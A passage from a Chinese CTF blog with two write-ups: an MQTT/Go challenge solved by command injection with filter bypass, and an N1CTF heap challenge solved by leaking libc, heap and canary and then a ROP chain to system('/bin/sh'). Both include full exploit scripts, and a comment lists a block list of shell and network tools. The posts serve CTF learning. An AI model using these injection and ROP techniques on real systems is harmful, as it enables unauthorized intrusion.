<h3 id="go语言的逆向"><a href="#go语言的逆向" class="headerlink" title="go语言的逆向"></a>go语言的逆向</h3><p>go语言生成的可执行程序一打开有点想c语言静态编译的样子，程序入口为<code>main_main</code>这里注意一般来说，<code>main_任意名字</code>代表这个函数&#x2F;变量是程序自定义的，而形如<code>runtime_writeBarrier()</code>类似的函数代表是go中runtime库对应的函数，另外题目中出现的<code>github_com_eclipse_paho_2emqtt_2egolang__ptr_ClientOptions_AddBroker()</code>这样的函数也是外部包导入的函数。</p>
<p>go的字符串与c++有很大区别，是二进制安全的，它不以\0作为终止符，一个字符串对象在内存中分为两部分，一部分为如下结构，占两个机器字用于索引数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">type StringHeader <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"> </span><br><span class="line">    Data uintptr            <span class="comment">// 字符串首地址</span></span><br><span class="line"> </span><br><span class="line">    Len  <span class="type">int</span>                <span class="comment">// 字符串长度</span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而它的另一部分才存放真正的数据，它的大小由字符串长度决定，在逆向中重点关注的是如上结构，因此说一个string占两个机器字，其他结构也按这种约定。</p>
<p>go语言一大特性就是用户层面实现的<strong>协程（Goroutine）</strong>，本质是轻量化的线程，能够轻松实现高并发，利用go函数启动一个Goroutine独立与主线程异步运行。对于协程的调度模型有非常多的内容，与本体无直接关联，具体实现可以参考：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/20862617">https://www.zhihu.com/question/20862617</a></p>
<h3 id="MQTT协议"><a href="#MQTT协议" class="headerlink" title="MQTT协议"></a>MQTT协议</h3><p>MQTT（Message Queuing Telemetry Transport）是一种轻量级、基于发布-订阅模式的消息传输协议，适用于资源受限的设备和低带宽、高延迟或不稳定的网络环境。它在物联网应用中广受欢迎，能够实现传感器、执行器和其它设备之间的高效通信。</p>
<h4 id="MQTT-Broker"><a href="#MQTT-Broker" class="headerlink" title="MQTT Broker"></a>MQTT Broker</h4><p>MQTT Broker 是负责处理客户端请求的关键组件，包括建立连接、断开连接、订阅和取消订阅等操作，同时还负责消息的转发。通常题目中会连接一个mqtt的brocker，绑定到一个开启mqtt服务的端口上，同时对于返回的<code>ClientOptions</code>进行连接函数绑定，消息处理函数绑定，新建一个<strong>mqtt客户端。</strong></p>
<h4 id="MQTT-Client"><a href="#MQTT-Client" class="headerlink" title="MQTT Client"></a>MQTT Client</h4><p>任何运行 <a target="_blank" rel="noopener" href="https://www.emqx.com/zh/mqtt-client-sdk">MQTT 客户端库</a>的应用或设备都是 MQTT 客户端。例如，使用 MQTT 的即时通讯应用是客户端，使用 MQTT 上报数据的各种传感器是客户端，各种 <a target="_blank" rel="noopener" href="https://www.emqx.com/zh/blog/mqtt-client-tools">MQTT 测试工具</a>也是客户端。</p>
<h4 id="MQTT-的工作流程："><a href="#MQTT-的工作流程：" class="headerlink" title="MQTT 的工作流程："></a>MQTT 的工作流程：</h4><ol>
<li><strong>客户端使用 TCP&#x2F;IP 协议与 Broker 建立连接</strong>，可以选择使用 TLS&#x2F;SSL 加密来实现安全通信。客户端提供认证信息，并指定会话类型（Clean Session 或 Persistent Session）。</li>
<li><strong>客户端既可以向特定主题发布消息，也可以订阅主题以接收消息</strong>。当客户端发布消息时，它会将消息发送给 MQTT Broker；而当客户端订阅消息时，它会接收与订阅主题相关的消息。**同时注意在用户端可以将特定主题绑定特定的massage_handler函数，实现接收到主题消息回调。**一个客户端也可以绑定一个连接函数，代表连接上brocker执行的动作，一般为subscribe一些主题</li>
<li><strong>MQTT Broker 接收发布的消息</strong>，并将这些消息转发给订阅了对应主题的客户端。它根据 QoS 等级确保消息可靠传递，并根据会话类型为断开连接的客户端存储消息。</li>
</ol>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>终于到题目了，这个题目其实就是利用go中的<code>github_com_eclipse_paho_2emqtt_2egolang</code>外部库连接到本地的brocker，创建了客户端，同时绑定了连接函数自动subscribe CTF主题，消息回调函数message_handler(具有命令执行漏洞)。并创建一个<code>Goroutine</code>每隔一段时间在<strong>CTF&#x2F;send</strong>主题下publihs一个泄露ping码的信息。注意对于这种题目的pwn方法是：我们需要自己写一个MQTT Client，通过利用这个有漏洞的MQTT Client从而getflag。</p>
<p>思路还是比较清晰的：创建题目中对应broker服务器的连接，根据题目subscribe的主题publish相应内容的信息从而触发有漏洞消息回调函数getflag。</p>
<p>题目文件中对于mqtt client的初始化：<img src="/2025/11/11/mqtt2%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1.png"></p>
<blockquote>
<p>注意这里直接在**<code>ClientOptions</code>**结构体中声明massage_handler代表该客户端只要收到自己subscribe的主题publish的消息就会触发</p>
</blockquote>
<p>massage_handler函数中逻辑比较简单：解析json消息格式，提取auth，cmd，arg字段。先检查auth内容是否长度为6且等于特定加密算法后的pin值前6位，然后判断cmd中字段是否等于<code>get_version</code>或者<code>set_vin</code>：get_version打开&#x2F;mnt&#x2F;version文件输出内容；set_vin将arg内容拼接到echo -n %s &gt; &#x2F;mnt&#x2F;VIN中。注意这里对于参数进行了比较严苛的子字符串检测常用的显示函数如<code>cat,tail以及flag</code>都被ban了。这里用‘’阶段一下cat以及flag，同时利用<code>;</code>注入命令，就能把flag内容带出来了。</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> paho.mqtt <span class="keyword">import</span> client <span class="keyword">as</span> mqtt_client</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">broker = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"><span class="comment"># Generate a Client ID with the publish prefix.</span></span><br><span class="line">client_id = <span class="string">f&#x27;publish-<span class="subst">&#123;random.randint(<span class="number">0</span>, <span class="number">1000</span>)&#125;</span>&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;public&#x27;</span></span><br><span class="line">main_lookup=[]</span><br><span class="line">received_pin=<span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    main_lookup.append ((<span class="number">37</span> * i + <span class="number">13</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize_connect</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">on_connect</span>(<span class="params">client, userdata, flags, reasonCode, properties=<span class="literal">None</span></span>):</span><br><span class="line">        client.subscribe(<span class="string">&quot;CTF&quot;</span>)</span><br><span class="line">        client.subscribe(<span class="string">&quot;CTF/send&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Connection created with topics subscribed&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">client, userdata, msg</span>):</span><br><span class="line">        message=msg.payload</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line">        data = json.loads(msg.payload.decode())</span><br><span class="line">        received_pin = data[<span class="string">&quot;pin&quot;</span>] </span><br><span class="line"></span><br><span class="line">    <span class="comment">#接下来进行与mqtt服务端连接的初始化</span></span><br><span class="line">    client = mqtt_client.Client(mqtt_client.CallbackAPIVersion.VERSION2, client_id)</span><br><span class="line">    client.on_connect = on_connect</span><br><span class="line">    client.on_message = on_message<span class="comment">#绑定连接的回调函数</span></span><br><span class="line">    client.connect(broker, port, keepalive=<span class="number">10000</span>)<span class="comment">#连接服务器</span></span><br><span class="line">    <span class="keyword">return</span> client</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrpyt</span>(<span class="params">buf</span>):</span><br><span class="line">    ans=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        tmp1=main_lookup[<span class="built_in">ord</span>(buf[i])]</span><br><span class="line">        out_byte=tmp1 - <span class="number">95</span>*((<span class="number">345</span>*tmp1)&gt;&gt;<span class="number">15</span>) + <span class="number">32</span></span><br><span class="line">        ans.append(<span class="built_in">chr</span>(out_byte))</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(ans)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_message</span>(<span class="params">auth:<span class="built_in">str</span>, cho_cmd:<span class="built_in">int</span>, arg:<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> cho_cmd == <span class="number">1</span>:</span><br><span class="line">        cmd = <span class="string">&quot;get_version&quot;</span></span><br><span class="line">    <span class="keyword">else</span> :cmd = <span class="string">&quot;set_vin&quot;</span></span><br><span class="line"></span><br><span class="line">    message = &#123;</span><br><span class="line">        <span class="string">&quot;auth&quot;</span>: auth,</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>: cmd,</span><br><span class="line">        <span class="string">&quot;arg&quot;</span>: arg</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#禁用列表：cat more head tail string awk sed cut xxd hexdump cmp diff base64 | &amp; $( 0x60 &gt; &lt; &gt;&gt; &lt;&lt; || &amp;&amp; sh  bash exec nc socat teknet ftp ... flag /dev .. gzip tar :method: :path :scheme :status accept-charset accept-encoding accept-language accept-range accept &quot;access-control-allow-origin age</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    client = initialize_connect()</span><br><span class="line">    client.loop_start()</span><br><span class="line">    client.publish(<span class="string">&quot;CTF/send&quot;</span>, <span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#泄露ping值</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#这里用publish CTF/send泄露pin值</span></span><br><span class="line">    mes = send_message(decrpyt(received_pin),<span class="number">0</span>,<span class="string">&#x27;;c\&#x27;\&#x27;at fl\&#x27;\&#x27;ag ;&#x27;</span>)<span class="comment">#从print内容中可以看到flag内容</span></span><br><span class="line">    client.publish(<span class="string">&quot;CTF&quot;</span>, json.dumps(mes))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line">    client.loop_stop()</span><br><span class="line">    client.disconnect()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">N1ctf中nipple题目复现</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-11-03 14:42:17" itemprop="dateCreated datePublished" datetime="2025-11-03T14:42:17+08:00">2025-11-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-11-05 07:58:28" itemprop="dateModified" datetime="2025-11-05T07:58:28+08:00">2025-11-05</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>跟着共享文档中师傅写的wp复现了一遍nipple（这是整个比赛中我唯一有能力复现的题目</p>
<p>题目乍看是一道比较经典的菜单题<img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1.png" alt="截屏2025-11-03 14.45.50"></p>
<p>然而初步逆向时却发现还是挺复杂的，特别是一些输出以及读入逻辑：简单来说对于某些特定的内容程序会用一个自定义函数存入动态内存中，然而对于读取也进行了一系列的操作：就对于我数据的存取而言，<strong>他会申请（原始大小*2+2）字节的chunk并将原始data中每个字节的低4位作为单独一字节的低4位同时保留原先动态内存中该字节高4位的值，高4位作为下一个字节的第四位的值保留原先高四位</strong></p>
<p>这里举一个例子：</p>
<p><img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/2.png" alt="截屏2025-11-03 14.55.52"></p>
<p>经过函数加工存储为:</p>
<p><img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/3.png"></p>
<p>堆块中存储信息也是这个形式，特别注意在4.Repack功能中，对于堆块的修改也是遵循上述的规定进行写入。</p>
<blockquote>
<p>这个读写逻辑的静态逆向比较难，个人感觉在要做题中需要多进行动态调试，通过动调并选择正确的关注点往往能够更快的弄懂程序的逻辑</p>
</blockquote>
<p>程序中还有许多第一次接触到的新知识：<img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/4.png">这里在菜单循环前new了一个0x1000大小的堆块，并将栈变量指向它。这是一个<strong>预分配的内存池</strong>，栈上存在0x10的变量分别存其基址以及游标(代表内存池的使用情况)。其实内存池与我之前接触的大部分堆题中的bss段存堆信息的作用是一样的。将这些信息存在动态内存中更加灵活，实现可拓展性。当然，如果我们能够通过构造堆overlapping或者堆溢出能控制这个内存池中的数据那么就达成了任意地址读写了。这里的内存池存在extend函数，总体逻辑就是如果游标以及到堆块的尾部的话就申请2倍自己大小复制原先内容然后free掉自己。这也一定程度上允许我们控制对应堆块的相对位置(本题没有用到)。</p>
<p>关注new功能：发现首先new的chunk没有正确初始化堆块数据便利用parse函数到新chunk中，从而造成libc与heap泄露。</p>
<p>再关注repack功能，发现读取长度可以自己选定一个不大于于chunk的size的值进行读入，这样输入大size加少数据，就能把栈中数据带出来。同时因为将数据parse进堆时同样逻辑，会造成堆溢出，通过repack在内存池地址旁的chunk溢出修改堆指针就能实现泄露cannary。getline可以实现栈溢出，修复指针(函数结尾会根据其free资源)打ROP即可。</p>
<blockquote>
<p>由于读入getline存在\x00截断所以无法直接泄露存储在chunk中的堆数据，一开始通过堆溢出想去覆盖对应chunk的0x18位置，但是因为getline输入仍然存在\x00截断，有点蠢。。。。</p>
<p>同时对于修改指针存在各种限制:首先写入的数据覆盖只能覆盖每个字节的低4位，因此直接覆盖到存在cannry_chunk+0x19的位置行不通(高4位不同)，通过该低4位为1刚好能够错开cnnary中\x00字节让它分散到两个字节中，也就没有\x00了能够正常带出来cannary。<img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/5.png">输出逻辑的判断是对于每两字节判断是否同时为0作为输出结束标识。<img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/6.png"></p>
</blockquote>
<p>poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gdb&#x27;</span>,<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;16296&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i, prompt=<span class="string">b&#x27;Choice: &#x27;</span></span>):</span><br><span class="line">    p.sendlineafter(prompt, <span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length (bytes, 0..0xf000): &quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,content</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length (bytes, 0..0xf000): &quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.sendafter(<span class="string">&quot;Data: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">staylower</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> data == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>  <span class="comment"># 或者返回 b&#x27;\x00&#x27; 如果你需要处理0</span></span><br><span class="line">    </span><br><span class="line">    ret = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    iterator = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取低4位</span></span><br><span class="line">    temp = data</span><br><span class="line">    <span class="keyword">while</span> temp != <span class="number">0</span>:</span><br><span class="line">        iterator.append(temp &amp; <span class="number">0xf</span>)</span><br><span class="line">        temp &gt;&gt;= <span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 组合字节</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(iterator) // <span class="number">2</span>):</span><br><span class="line">        a = iterator[<span class="number">2</span> * i]</span><br><span class="line">        b = iterator[<span class="number">2</span> * i + <span class="number">1</span>]</span><br><span class="line">        result = (a &lt;&lt; <span class="number">4</span>) + b</span><br><span class="line">        ret += <span class="built_in">bytes</span>([result])  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">add(<span class="number">0x3b</span>) <span class="comment">#改堆块存cannary</span></span><br><span class="line"><span class="comment">#泄露libc与heap地址</span></span><br><span class="line">add(<span class="number">0xf000</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">0xf000</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address=leak_libc-<span class="number">0x203b20</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">pop_rdi=libc.address+<span class="number">0x10f75b</span></span><br><span class="line">ret=libc.address+<span class="number">0x2a875</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">0x23</span>)<span class="comment">#改堆块在内存池之前，用来溢出覆盖堆块指针</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">target=(leak_heap&lt;&lt;<span class="number">12</span>)+<span class="number">0x601</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(target))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak cnnary</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#改指针➕泄露</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x3c</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x24</span>)+staylower(<span class="number">0x1011</span>)+<span class="string">b&#x27;\x00\x00\x00&#x27;</span>+staylower(target)+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recv(<span class="number">0x17</span>)</span><br><span class="line">out_put=p.recv(<span class="number">9</span>).<span class="built_in">hex</span>().lstrip(<span class="string">&#x27;0x&#x27;</span>)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">cannary=u64(<span class="built_in">bytes</span>.fromhex(out_put))</span><br><span class="line">log.success(out_put)</span><br><span class="line">log.success(<span class="built_in">hex</span>(cannary))</span><br><span class="line"><span class="comment">#修复指针</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x3c</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x24</span>)+staylower(<span class="number">0x1011</span>)+<span class="string">b&#x27;\x00\x00\x00&#x27;</span>+staylower(target-<span class="number">1</span>)+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#栈溢出ROP</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x78</span>,cyclic(<span class="number">0x18</span>)+p64(cannary)+cyclic(<span class="number">0x38</span>)+p64(pop_rdi)+p64(<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))+p64(ret)+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line"><span class="comment">#触发ret</span></span><br><span class="line">cmd(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="总结收获"><a href="#总结收获" class="headerlink" title="总结收获"></a>总结收获</h2><p>总的来说题目的利用手法并不是很难，堆溢出泄露数据➕栈溢出。但是题目的逆向量相对较大，对于堆的开辟以及释放过程比较绕，数据写入读取逻辑需要细心逆向。对于ida一打开感觉很难从头逆到尾的程序可以先gdb动态调试一下，关注堆块以及数据的变化再结合静态逆向食用效果更佳！</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/03/linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/11/03/linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">linux内核初探及环境搭建</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-11-03 01:36:58" itemprop="dateCreated datePublished" datetime="2025-11-03T01:36:58+08:00">2025-11-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-11-10 15:53:36" itemprop="dateModified" datetime="2025-11-10T15:53:36+08:00">2025-11-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
